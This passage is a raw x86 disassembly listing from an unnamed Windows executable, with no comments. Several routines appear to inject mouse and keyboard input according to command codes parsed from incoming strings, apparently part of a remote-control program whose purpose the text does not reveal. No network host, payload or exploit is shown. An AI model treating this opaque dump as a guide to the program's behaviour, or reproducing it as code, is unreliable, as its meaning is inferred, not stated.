  409c2a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409c2e:	56                   	push   %esi
  409c2f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409c32:	8b f1                	mov    %ecx,%esi
  409c34:	50                   	push   %eax
  409c35:	ff 76 04             	push   0x4(%esi)
  409c38:	e8 0b 2b 00 00       	call   0x40c748
  409c3d:	50                   	push   %eax
  409c3e:	8b ce                	mov    %esi,%ecx
  409c40:	e8 2d 00 00 00       	call   0x409c72
  409c45:	6a 10                	push   $0x10
  409c47:	e8 19 00 00 00       	call   0x409c65
  409c4c:	85 c0                	test   %eax,%eax
  409c4e:	59                   	pop    %ecx
  409c4f:	74 0f                	je     0x409c60
  409c51:	ff 76 08             	push   0x8(%esi)
  409c54:	8b c8                	mov    %eax,%ecx
  409c56:	ff 75 fc             	push   -0x4(%ebp)
  409c59:	e8 4d 00 00 00       	call   0x409cab
  409c5e:	eb 02                	jmp    0x409c62
  409c60:	33 c0                	xor    %eax,%eax
  409c62:	5e                   	pop    %esi
  409c63:	c9                   	leave
  409c64:	c3                   	ret
  409c65:	55                   	push   %ebp
  409c66:	8b ec                	mov    %esp,%ebp
  409c68:	ff 75 08             	push   0x8(%ebp)
  409c6b:	e8 de 2a 00 00       	call   0x40c74e
  409c70:	5d                   	pop    %ebp
  409c71:	c3                   	ret
  409c72:	55                   	push   %ebp
  409c73:	8b ec                	mov    %esp,%ebp
  409c75:	8b 45 08             	mov    0x8(%ebp),%eax
  409c78:	85 c0                	test   %eax,%eax
  409c7a:	74 05                	je     0x409c81
  409c7c:	89 41 08             	mov    %eax,0x8(%ecx)
  409c7f:	eb 02                	jmp    0x409c83
  409c81:	33 c0                	xor    %eax,%eax
  409c83:	5d                   	pop    %ebp
  409c84:	c2 04 00             	ret    $0x4
  409c87:	55                   	push   %ebp
  409c88:	8b ec                	mov    %esp,%ebp
  409c8a:	56                   	push   %esi
  409c8b:	8b f1                	mov    %ecx,%esi
  409c8d:	ff 75 10             	push   0x10(%ebp)
  409c90:	ff 75 0c             	push   0xc(%ebp)
  409c93:	ff 75 08             	push   0x8(%ebp)
  409c96:	ff 76 04             	push   0x4(%esi)
  409c99:	e8 b6 2a 00 00       	call   0x40c754
  409c9e:	50                   	push   %eax
  409c9f:	8b ce                	mov    %esi,%ecx
  409ca1:	e8 cc ff ff ff       	call   0x409c72
  409ca6:	5e                   	pop    %esi
  409ca7:	5d                   	pop    %ebp
  409ca8:	c2 0c 00             	ret    $0xc
  409cab:	55                   	push   %ebp
  409cac:	8b ec                	mov    %esp,%ebp
  409cae:	56                   	push   %esi
  409caf:	8b f1                	mov    %ecx,%esi
  409cb1:	ff 75 08             	push   0x8(%ebp)
  409cb4:	c7 06 2c de 40 00    	movl   $0x40de2c,(%esi)
  409cba:	e8 0d 00 00 00       	call   0x409ccc
  409cbf:	8b 45 0c             	mov    0xc(%ebp),%eax
  409cc2:	89 46 08             	mov    %eax,0x8(%esi)
  409cc5:	8b c6                	mov    %esi,%eax
  409cc7:	5e                   	pop    %esi
  409cc8:	5d                   	pop    %ebp
  409cc9:	c2 08 00             	ret    $0x8
  409ccc:	55                   	push   %ebp
  409ccd:	8b ec                	mov    %esp,%ebp
  409ccf:	8b 45 08             	mov    0x8(%ebp),%eax
  409cd2:	89 41 04             	mov    %eax,0x4(%ecx)
  409cd5:	5d                   	pop    %ebp
  409cd6:	c2 04 00             	ret    $0x4
  409cd9:	55                   	push   %ebp
  409cda:	8b ec                	mov    %esp,%ebp
  409cdc:	83 ec 20             	sub    $0x20,%esp
  409cdf:	53                   	push   %ebx
  409ce0:	56                   	push   %esi
  409ce1:	33 db                	xor    %ebx,%ebx
  409ce3:	57                   	push   %edi
  409ce4:	53                   	push   %ebx
  409ce5:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409ce8:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409cee:	8a 00                	mov    (%eax),%al
  409cf0:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409cf3:	88 45 ff             	mov    %al,-0x1(%ebp)
  409cf6:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  409cfb:	ff 30                	push   (%eax)
  409cfd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409d00:	6a 01                	push   $0x1
  409d02:	50                   	push   %eax
  409d03:	ff 15 cc d2 40 00    	call   *0x40d2cc
  409d09:	8a 45 ff             	mov    -0x1(%ebp),%al
  409d0c:	3c 30                	cmp    $0x30,%al
  409d0e:	75 2d                	jne    0x409d3d
  409d10:	53                   	push   %ebx
  409d11:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409d14:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409d1a:	8a 00                	mov    (%eax),%al
  409d1c:	6a 01                	push   $0x1
  409d1e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409d21:	88 45 f8             	mov    %al,-0x8(%ebp)
  409d24:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409d2a:	38 18                	cmp    %bl,(%eax)
  409d2c:	0f 95 c0             	setne  %al
  409d2f:	50                   	push   %eax
  409d30:	ff 75 f8             	push   -0x8(%ebp)
  409d33:	e8 ac fb ff ff       	call   0x4098e4
  409d38:	e9 f2 00 00 00       	jmp    0x409e2f
  409d3d:	3c 31                	cmp    $0x31,%al
  409d3f:	75 5d                	jne    0x409d9e
  409d41:	53                   	push   %ebx
  409d42:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409d45:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409d4b:	66 8b 30             	mov    (%eax),%si
  409d4e:	6a 02                	push   $0x2
  409d50:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409d53:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409d59:	38 18                	cmp    %bl,(%eax)
  409d5b:	6a 03                	push   $0x3
  409d5d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409d60:	0f 95 c0             	setne  %al
  409d63:	88 45 f0             	mov    %al,-0x10(%ebp)
  409d66:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409d6c:	38 18                	cmp    %bl,(%eax)
  409d6e:	6a 04                	push   $0x4
  409d70:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409d73:	0f 95 c0             	setne  %al
  409d76:	88 45 f4             	mov    %al,-0xc(%ebp)
  409d79:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409d7f:	38 18                	cmp    %bl,(%eax)
  409d81:	0f 95 c0             	setne  %al
  409d84:	88 45 f8             	mov    %al,-0x8(%ebp)
  409d87:	ff 75 f8             	push   -0x8(%ebp)
  409d8a:	ff 75 f4             	push   -0xc(%ebp)
  409d8d:	ff 75 f0             	push   -0x10(%ebp)
  409d90:	56                   	push   %esi
  409d91:	e8 98 01 00 00       	call   0x409f2e
  409d96:	83 c4 10             	add    $0x10,%esp
  409d99:	e9 93 00 00 00       	jmp    0x409e31
  409d9e:	3c 32                	cmp    $0x32,%al
  409da0:	75 34                	jne    0x409dd6
  409da2:	53                   	push   %ebx
  409da3:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409da6:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409dac:	6a 04                	push   $0x4
  409dae:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409db1:	8b f0                	mov    %eax,%esi
  409db3:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409db9:	6a 08                	push   $0x8
  409dbb:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409dbe:	8b f8                	mov    %eax,%edi
  409dc0:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409dc6:	ff 30                	push   (%eax)
  409dc8:	ff 37                	push   (%edi)
  409dca:	ff 36                	push   (%esi)
  409dcc:	e8 77 00 00 00       	call   0x409e48
  409dd1:	83 c4 0c             	add    $0xc,%esp
  409dd4:	eb 5b                	jmp    0x409e31
  409dd6:	3c 33                	cmp    $0x33,%al
  409dd8:	75 31                	jne    0x409e0b
  409dda:	53                   	push   %ebx
  409ddb:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409dde:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409de4:	6a 04                	push   $0x4
  409de6:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409de9:	8b f0                	mov    %eax,%esi
  409deb:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409df1:	6a 08                	push   $0x8
  409df3:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409df6:	8b f8                	mov    %eax,%edi
  409df8:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409dfe:	ff 30                	push   (%eax)
  409e00:	ff 37                	push   (%edi)
  409e02:	ff 36                	push   (%esi)
  409e04:	e8 96 00 00 00       	call   0x409e9f
  409e09:	eb c6                	jmp    0x409dd1
  409e0b:	3c 34                	cmp    $0x34,%al
  409e0d:	75 22                	jne    0x409e31
  409e0f:	53                   	push   %ebx
  409e10:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409e13:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409e19:	6a 04                	push   $0x4
  409e1b:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409e1e:	8b f0                	mov    %eax,%esi
  409e20:	ff 15 ac d2 40 00    	call   *0x40d2ac
  409e26:	ff 30                	push   (%eax)
  409e28:	ff 36                	push   (%esi)
  409e2a:	e8 c7 00 00 00       	call   0x409ef6
  409e2f:	59                   	pop    %ecx
  409e30:	59                   	pop    %ecx
  409e31:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409e34:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409e3a:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409e3d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409e43:	5f                   	pop    %edi
  409e44:	5e                   	pop    %esi
  409e45:	5b                   	pop    %ebx
  409e46:	c9                   	leave
  409e47:	c3                   	ret
  409e48:	55                   	push   %ebp
  409e49:	8b ec                	mov    %esp,%ebp
  409e4b:	83 ec 1c             	sub    $0x1c,%esp
  409e4e:	8b 45 08             	mov    0x8(%ebp),%eax
  409e51:	83 e8 00             	sub    $0x0,%eax
  409e54:	74 0e                	je     0x409e64
  409e56:	48                   	dec    %eax
  409e57:	74 07                	je     0x409e60
  409e59:	48                   	dec    %eax
  409e5a:	75 0d                	jne    0x409e69
  409e5c:	6a 20                	push   $0x20
  409e5e:	eb 06                	jmp    0x409e66
  409e60:	6a 08                	push   $0x8
  409e62:	eb 02                	jmp    0x409e66
  409e64:	6a 02                	push   $0x2
  409e66:	5a                   	pop    %edx
  409e67:	eb 03                	jmp    0x409e6c
  409e69:	8b 55 08             	mov    0x8(%ebp),%edx
  409e6c:	57                   	push   %edi
  409e6d:	6a 07                	push   $0x7
  409e6f:	59                   	pop    %ecx
  409e70:	33 c0                	xor    %eax,%eax
  409e72:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  409e75:	6a 1c                	push   $0x1c
  409e77:	f3 ab                	rep stos %eax,%es:(%edi)
  409e79:	21 45 e4             	and    %eax,-0x1c(%ebp)
  409e7c:	8b 45 0c             	mov    0xc(%ebp),%eax
  409e7f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  409e82:	8b 45 10             	mov    0x10(%ebp),%eax
  409e85:	89 45 ec             	mov    %eax,-0x14(%ebp)
  409e88:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409e8b:	66 81 ca 01 80       	or     $0x8001,%dx
  409e90:	50                   	push   %eax
  409e91:	6a 01                	push   $0x1
  409e93:	89 55 f4             	mov    %edx,-0xc(%ebp)
  409e96:	ff 15 cc d3 40 00    	call   *0x40d3cc
  409e9c:	5f                   	pop    %edi
  409e9d:	c9                   	leave
  409e9e:	c3                   	ret
  409e9f:	55                   	push   %ebp
  409ea0:	8b ec                	mov    %esp,%ebp
  409ea2:	83 ec 1c             	sub    $0x1c,%esp
  409ea5:	8b 45 08             	mov    0x8(%ebp),%eax
  409ea8:	83 e8 00             	sub    $0x0,%eax
  409eab:	74 0e                	je     0x409ebb
  409ead:	48                   	dec    %eax
  409eae:	74 07                	je     0x409eb7
  409eb0:	48                   	dec    %eax
  409eb1:	75 0d                	jne    0x409ec0
  409eb3:	6a 40                	push   $0x40
  409eb5:	eb 06                	jmp    0x409ebd
  409eb7:	6a 10                	push   $0x10
  409eb9:	eb 02                	jmp    0x409ebd
  409ebb:	6a 04                	push   $0x4
  409ebd:	5a                   	pop    %edx
  409ebe:	eb 03                	jmp    0x409ec3
  409ec0:	8b 55 08             	mov    0x8(%ebp),%edx
  409ec3:	57                   	push   %edi
  409ec4:	6a 07                	push   $0x7
  409ec6:	59                   	pop    %ecx
  409ec7:	33 c0                	xor    %eax,%eax
  409ec9:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  409ecc:	6a 1c                	push   $0x1c
  409ece:	f3 ab                	rep stos %eax,%es:(%edi)
  409ed0:	21 45 e4             	and    %eax,-0x1c(%ebp)
  409ed3:	8b 45 0c             	mov    0xc(%ebp),%eax
  409ed6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  409ed9:	8b 45 10             	mov    0x10(%ebp),%eax
  409edc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  409edf:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409ee2:	66 81 ca 01 80       	or     $0x8001,%dx
  409ee7:	50                   	push   %eax
  409ee8:	6a 01                	push   $0x1
  409eea:	89 55 f4             	mov    %edx,-0xc(%ebp)
  409eed:	ff 15 cc d3 40 00    	call   *0x40d3cc
  409ef3:	5f                   	pop    %edi
  409ef4:	c9                   	leave
  409ef5:	c3                   	ret
  409ef6:	55                   	push   %ebp
  409ef7:	8b ec                	mov    %esp,%ebp
  409ef9:	83 ec 1c             	sub    $0x1c,%esp
  409efc:	57                   	push   %edi
  409efd:	6a 07                	push   $0x7
  409eff:	59                   	pop    %ecx
  409f00:	33 c0                	xor    %eax,%eax
  409f02:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  409f05:	6a 1c                	push   $0x1c
  409f07:	f3 ab                	rep stos %eax,%es:(%edi)
  409f09:	21 45 e4             	and    %eax,-0x1c(%ebp)
  409f0c:	8b 45 08             	mov    0x8(%ebp),%eax
  409f0f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  409f12:	8b 45 0c             	mov    0xc(%ebp),%eax
  409f15:	89 45 ec             	mov    %eax,-0x14(%ebp)
  409f18:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409f1b:	50                   	push   %eax
  409f1c:	6a 01                	push   $0x1
  409f1e:	c7 45 f4 01 80 00 00 	movl   $0x8001,-0xc(%ebp)
  409f25:	ff 15 cc d3 40 00    	call   *0x40d3cc
  409f2b:	5f                   	pop    %edi
  409f2c:	c9                   	leave
  409f2d:	c3                   	ret
  409f2e:	55                   	push   %ebp
  409f2f:	8b ec                	mov    %esp,%ebp
  409f31:	83 ec 1c             	sub    $0x1c,%esp
  409f34:	53                   	push   %ebx
  409f35:	56                   	push   %esi
  409f36:	8b 35 cc d3 40 00    	mov    0x40d3cc,%esi
  409f3c:	57                   	push   %edi
  409f3d:	6a 01                	push   $0x1
  409f3f:	5b                   	pop    %ebx
  409f40:	38 5d 0c             	cmp    %bl,0xc(%ebp)
  409f43:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  409f46:	75 13                	jne    0x409f5b
  409f48:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  409f4c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409f4f:	6a 1c                	push   $0x1c
  409f51:	50                   	push   %eax
  409f52:	53                   	push   %ebx
  409f53:	66 c7 45 e8 10 00    	movw   $0x10,-0x18(%ebp)
  409f59:	ff d6                	call   *%esi
  409f5b:	38 5d 10             	cmp    %bl,0x10(%ebp)
  409f5e:	75 13                	jne    0x409f73
  409f60:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  409f64:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409f67:	6a 1c                	push   $0x1c
  409f69:	50                   	push   %eax
  409f6a:	53                   	push   %ebx
  409f6b:	66 c7 45 e8 11 00    	movw   $0x11,-0x18(%ebp)
  409f71:	ff d6                	call   *%esi
  409f73:	38 5d 14             	cmp    %bl,0x14(%ebp)
  409f76:	75 13                	jne    0x409f8b
  409f78:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  409f7c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409f7f:	6a 1c                	push   $0x1c
  409f81:	50                   	push   %eax
  409f82:	53                   	push   %ebx
  409f83:	66 c7 45 e8 12 00    	movw   $0x12,-0x18(%ebp)
  409f89:	ff d6                	call   *%esi
  409f8b:	66 8b 7d 08          	mov    0x8(%ebp),%di
  409f8f:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  409f93:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409f96:	6a 1c                	push   $0x1c
  409f98:	50                   	push   %eax
  409f99:	53                   	push   %ebx
  409f9a:	66 89 7d e8          	mov    %di,-0x18(%ebp)
  409f9e:	ff d6                	call   *%esi
  409fa0:	6a 02                	push   $0x2
  409fa2:	66 89 7d e8          	mov    %di,-0x18(%ebp)
  409fa6:	5f                   	pop    %edi
  409fa7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409faa:	6a 1c                	push   $0x1c
  409fac:	50                   	push   %eax
  409fad:	53                   	push   %ebx
  409fae:	89 7d ec             	mov    %edi,-0x14(%ebp)
  409fb1:	ff d6                	call   *%esi
  409fb3:	38 5d 0c             	cmp    %bl,0xc(%ebp)
  409fb6:	75 12                	jne    0x409fca
  409fb8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409fbb:	6a 1c                	push   $0x1c
  409fbd:	50                   	push   %eax
  409fbe:	53                   	push   %ebx
  409fbf:	66 c7 45 e8 10 00    	movw   $0x10,-0x18(%ebp)
  409fc5:	89 7d ec             	mov    %edi,-0x14(%ebp)
  409fc8:	ff d6                	call   *%esi
  409fca:	38 5d 10             	cmp    %bl,0x10(%ebp)
  409fcd:	75 12                	jne    0x409fe1
  409fcf:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409fd2:	6a 1c                	push   $0x1c
  409fd4:	50                   	push   %eax
  409fd5:	53                   	push   %ebx
  409fd6:	66 c7 45 e8 11 00    	movw   $0x11,-0x18(%ebp)
  409fdc:	89 7d ec             	mov    %edi,-0x14(%ebp)
  409fdf:	ff d6                	call   *%esi
  409fe1:	38 5d 14             	cmp    %bl,0x14(%ebp)
  409fe4:	75 12                	jne    0x409ff8
  409fe6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409fe9:	6a 1c                	push   $0x1c
  409feb:	50                   	push   %eax
  409fec:	53                   	push   %ebx
  409fed:	66 c7 45 e8 12 00    	movw   $0x12,-0x18(%ebp)
  409ff3:	89 7d ec             	mov    %edi,-0x14(%ebp)
  409ff6:	ff d6                	call   *%esi
  409ff8:	5f                   	pop    %edi
  409ff9:	5e                   	pop    %esi
  409ffa:	5b                   	pop    %ebx
  409ffb:	c9                   	leave
  409ffc:	c3                   	ret
  409ffd:	e8 05 00 00 00       	call   0x40a007
  40a002:	e9 0d 00 00 00       	jmp    0x40a014
  40a007:	6a 00                	push   $0x0
  40a009:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a00e:	e8 65 70 ff ff       	call   0x401078
  40a013:	c3                   	ret
  40a014:	68 20 a0 40 00       	push   $0x40a020
  40a019:	e8 9a 23 00 00       	call   0x40c3b8
  40a01e:	59                   	pop    %ecx
  40a01f:	c3                   	ret
  40a020:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a025:	e9 41 71 ff ff       	jmp    0x40116b
  40a02a:	e8 05 00 00 00       	call   0x40a034
  40a02f:	e9 15 00 00 00       	jmp    0x40a049
  40a034:	55                   	push   %ebp
  40a035:	8b ec                	mov    %esp,%ebp
  40a037:	51                   	push   %ecx
  40a038:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40a03b:	b9 00 1d 41 00       	mov    $0x411d00,%ecx
  40a040:	50                   	push   %eax
  40a041:	ff 15 dc d2 40 00    	call   *0x40d2dc
  40a047:	c9                   	leave
  40a048:	c3                   	ret
  40a049:	68 55 a0 40 00       	push   $0x40a055
  40a04e:	e8 65 23 00 00       	call   0x40c3b8
  40a053:	59                   	pop    %ecx
  40a054:	c3                   	ret
  40a055:	b9 00 1d 41 00       	mov    $0x411d00,%ecx
  40a05a:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  40a060:	55                   	push   %ebp
  40a061:	8b ec                	mov    %esp,%ebp
  40a063:	83 ec 30             	sub    $0x30,%esp
  40a066:	53                   	push   %ebx
  40a067:	56                   	push   %esi
  40a068:	8d 45 08             	lea    0x8(%ebp),%eax
  40a06b:	57                   	push   %edi
  40a06c:	50                   	push   %eax
  40a06d:	b9 00 1d 41 00       	mov    $0x411d00,%ecx
  40a072:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40a078:	bb 10 1d 41 00       	mov    $0x411d10,%ebx
  40a07d:	8b cb                	mov    %ebx,%ecx
  40a07f:	e8 1c 70 ff ff       	call   0x4010a0
  40a084:	83 ec 10             	sub    $0x10,%esp
  40a087:	be 78 11 41 00       	mov    $0x411178,%esi
  40a08c:	8b fc                	mov    %esp,%edi
  40a08e:	8b cb                	mov    %ebx,%ecx
  40a090:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a091:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a092:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a093:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a094:	e8 6a 70 ff ff       	call   0x401103
  40a099:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40a09c:	50                   	push   %eax
  40a09d:	e8 34 05 00 00       	call   0x40a5d6
  40a0a2:	50                   	push   %eax
  40a0a3:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a0a6:	50                   	push   %eax
  40a0a7:	e8 22 12 00 00       	call   0x40b2ce
  40a0ac:	51                   	push   %ecx
  40a0ad:	8b f4                	mov    %esp,%esi
  40a0af:	50                   	push   %eax
  40a0b0:	8d 45 08             	lea    0x8(%ebp),%eax
  40a0b3:	68 68 11 41 00       	push   $0x411168
  40a0b8:	50                   	push   %eax
  40a0b9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a0bc:	50                   	push   %eax
  40a0bd:	e8 f6 25 00 00       	call   0x40c6b8
  40a0c2:	83 c4 0c             	add    $0xc,%esp
  40a0c5:	50                   	push   %eax
  40a0c6:	56                   	push   %esi
  40a0c7:	e8 ec 25 00 00       	call   0x40c6b8
  40a0cc:	83 c4 0c             	add    $0xc,%esp
  40a0cf:	8b cb                	mov    %ebx,%ecx
  40a0d1:	6a 34                	push   $0x34
  40a0d3:	e8 52 70 ff ff       	call   0x40112a
  40a0d8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a0db:	8b f0                	mov    %eax,%esi
  40a0dd:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a0e3:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40a0e6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a0ec:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40a0ef:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a0f5:	68 11 a1 40 00       	push   $0x40a111
  40a0fa:	8b cb                	mov    %ebx,%ecx
  40a0fc:	e8 7f 70 ff ff       	call   0x401180
  40a101:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a104:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a10a:	8b c6                	mov    %esi,%eax
  40a10c:	5f                   	pop    %edi
  40a10d:	5e                   	pop    %esi
  40a10e:	5b                   	pop    %ebx
  40a10f:	c9                   	leave
  40a110:	c3                   	ret
  40a111:	55                   	push   %ebp
  40a112:	8b ec                	mov    %esp,%ebp
  40a114:	81 ec d4 00 00 00    	sub    $0xd4,%esp
  40a11a:	53                   	push   %ebx
  40a11b:	56                   	push   %esi
  40a11c:	57                   	push   %edi
  40a11d:	33 ff                	xor    %edi,%edi
  40a11f:	57                   	push   %edi
  40a120:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40a123:	ff 15 ac d2 40 00    	call   *0x40d2ac
  40a129:	8a 18                	mov    (%eax),%bl
  40a12b:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  40a130:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40a133:	ff 30                	push   (%eax)
  40a135:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a138:	6a 01                	push   $0x1
  40a13a:	50                   	push   %eax
  40a13b:	ff 15 cc d2 40 00    	call   *0x40d2cc
  40a141:	50                   	push   %eax
  40a142:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40a145:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40a14b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40a14e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a154:	83 ec 10             	sub    $0x10,%esp
  40a157:	be 68 11 41 00       	mov    $0x411168,%esi
  40a15c:	8b cc                	mov    %esp,%ecx
  40a15e:	56                   	push   %esi
  40a15f:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40a165:	83 ec 10             	sub    $0x10,%esp
  40a168:	8d 45 0c             	lea    0xc(%ebp),%eax
  40a16b:	8b cc                	mov    %esp,%ecx
  40a16d:	50                   	push   %eax
  40a16e:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40a174:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a177:	50                   	push   %eax
  40a178:	e8 70 12 00 00       	call   0x40b3ed
  40a17d:	0f be c3             	movsbl %bl,%eax
  40a180:	83 c4 24             	add    $0x24,%esp
  40a183:	48                   	dec    %eax
  40a184:	0f 84 04 04 00 00    	je     0x40a58e
  40a18a:	48                   	dec    %eax
  40a18b:	0f 84 6d 03 00 00    	je     0x40a4fe
  40a191:	48                   	dec    %eax
  40a192:	0f 84 d9 02 00 00    	je     0x40a471
  40a198:	48                   	dec    %eax
  40a199:	0f 84 4b 02 00 00    	je     0x40a3ea
  40a19f:	48                   	dec    %eax
  40a1a0:	0f 84 b3 01 00 00    	je     0x40a359
  40a1a6:	48                   	dec    %eax
  40a1a7:	0f 84 15 01 00 00    	je     0x40a2c2
  40a1ad:	48                   	dec    %eax
  40a1ae:	0f 85 0c 04 00 00    	jne    0x40a5c0
  40a1b4:	57                   	push   %edi
  40a1b5:	6a 02                	push   $0x2
  40a1b7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a1ba:	e8 fb 09 00 00       	call   0x40abba
  40a1bf:	8b c8                	mov    %eax,%ecx
  40a1c1:	ff 15 ac d2 40 00    	call   *0x40d2ac
  40a1c7:	8a 00                	mov    (%eax),%al
  40a1c9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a1cc:	50                   	push   %eax
  40a1cd:	57                   	push   %edi
  40a1ce:	e8 e7 09 00 00       	call   0x40abba
  40a1d3:	83 ec 10             	sub    $0x10,%esp
  40a1d6:	8b cc                	mov    %esp,%ecx
  40a1d8:	50                   	push   %eax
  40a1d9:	51                   	push   %ecx
  40a1da:	e8 1b 11 00 00       	call   0x40b2fa
  40a1df:	59                   	pop    %ecx
  40a1e0:	59                   	pop    %ecx
  40a1e1:	e8 4e 09 00 00       	call   0x40ab34
  40a1e6:	83 c4 14             	add    $0x14,%esp
  40a1e9:	84 c0                	test   %al,%al
  40a1eb:	0f 84 89 00 00 00    	je     0x40a27a
  40a1f1:	6a 02                	push   $0x2
  40a1f3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a1f6:	e8 bf 09 00 00       	call   0x40abba
  40a1fb:	83 ec 10             	sub    $0x10,%esp
  40a1fe:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a201:	8b dc                	mov    %esp,%ebx
  40a203:	50                   	push   %eax
  40a204:	56                   	push   %esi
  40a205:	6a 01                	push   $0x1
  40a207:	e8 ae 09 00 00       	call   0x40abba
  40a20c:	50                   	push   %eax
  40a20d:	56                   	push   %esi
  40a20e:	57                   	push   %edi
  40a20f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a212:	e8 a3 09 00 00       	call   0x40abba
  40a217:	50                   	push   %eax
  40a218:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  40a21e:	50                   	push   %eax
  40a21f:	e8 94 24 00 00       	call   0x40c6b8
  40a224:	83 c4 0c             	add    $0xc,%esp
  40a227:	50                   	push   %eax
  40a228:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40a22e:	50                   	push   %eax
  40a22f:	e8 84 24 00 00       	call   0x40c6b8
  40a234:	83 c4 0c             	add    $0xc,%esp
  40a237:	50                   	push   %eax
  40a238:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a23b:	50                   	push   %eax
  40a23c:	e8 77 24 00 00       	call   0x40c6b8
  40a241:	83 c4 0c             	add    $0xc,%esp
  40a244:	50                   	push   %eax
  40a245:	53                   	push   %ebx
  40a246:	e8 6d 24 00 00       	call   0x40c6b8
  40a24b:	83 c4 0c             	add    $0xc,%esp
  40a24e:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a253:	6a 7e                	push   $0x7e
  40a255:	e8 d0 6e ff ff       	call   0x40112a
  40a25a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40a25d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a263:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  40a269:	ff 15 d8 d2 40 00    	call   *0x40d2d8
